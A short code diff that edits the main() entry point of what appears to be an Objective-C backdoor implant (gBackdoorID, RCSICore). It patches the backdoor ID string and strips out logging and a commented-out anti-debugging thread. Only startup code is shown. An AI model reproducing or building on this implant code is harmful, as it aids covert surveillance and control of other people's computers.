@@ -22,28 +22,18 @@ int main (int argc, const char * argv[])
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // FIXED- fixing string binary patched
+  gBackdoorID[14] = gBackdoorID[15] = 0;
+  
   int shMemKey  = 31337;
   int shMemSize = SHMEM_COMMAND_MAX_SIZE;
   NSString *semaphoreName = @"SUX";
   
-#ifdef ENABLE_LOGGING
-  [RCSILogger setComponent: @"core"];
-  infoLog(@"STARTING");
-#endif
-
-  //CFShow (CFRunLoopGetCurrent ());
   RCSICore *core = [[RCSICore alloc] initWithKey: shMemKey
                                 sharedMemorySize: shMemSize
                                    semaphoreName: semaphoreName];
-  
-  //
-  // Spawn a thread which checks whenever a debugger is attaching our app
-  //
-  /*
-  [NSThread detachNewThreadSelector: @selector(amIBeingDebugged)
-                           toTarget: core
-                         withObject: nil];
-  */
+
+  // the entry point
   [core runMeh];
   
   [pool release];
